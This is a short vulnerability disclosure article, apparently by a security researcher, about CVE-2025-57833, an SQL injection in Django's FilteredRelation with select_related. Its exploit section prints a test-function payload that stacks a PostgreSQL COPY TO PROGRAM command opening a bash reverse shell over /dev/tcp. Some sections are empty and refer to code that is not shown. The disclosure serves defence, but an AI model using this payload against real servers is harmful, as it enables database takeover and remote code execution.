# :globe_with_meridians: CVE-2025-57833: Django Unauthenticated, 0 click, RCE, and SQL Injection using default configuration.

---

# CVE-2025–57833: Django Unauthenticated, 0 click, RCE, and SQL Injection using default configuration.

Article about the critical CVE-2025–57833 I found in Django.

### Impact:

RCE on PostgreSQL and SQL Injection on all of the databases.

### Vulnerable code:

### Vulnerability detection:

In order for you to be vulnerable, you need to use the ‘FilteredRelation’ function as above, with ‘select_related’. An attacker with control over the ‘FilteredRelation’ and the ‘select_related’ as above will be able to exploit the vulnerability.

### Exploit:

The ‘select_related’ argument is the one that gets into the SQL query; however, Django checks in the above code that the first ‘user_data’ and the second ‘user_data’ are the same. The above code will not work because of the + “e”.

### Obtain RCE:

The code below will use PostgreSQL “copy” and “program” to execute a reverse shell:

```
def test_select_related_foreign_key_sqli(self):
user_data = 'author_join."id", author_join."name", author_join."content_type_id", author_join."object_id" FROM "filtered_relation_book" INNER JOIN "filtered_relation_author" author_join ON ("filtered_relation_book"."author_id" = author_join."id") ; COPY (SELECT \'\') TO PROGRAM \'bash -i >& /dev/tcp/127.0.0.1/1025 0>&1\'; -- '

qs = (
Book.objects.annotate({
user_data: FilteredRelation("author"),
})
.select_related(user_data)
)

qs._fetch_all()
```

### Proof of Concept (PoC):

EyalSec CVEs:

## Get EyalSec’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

[https://github.com/EyalSec/EyalSec_CVE/](https://github.com/EyalSec/EyalSec_CVE/)

If you have any questions or you want to collaborate with me, you can email me at: eyal@eyalsec.com

---
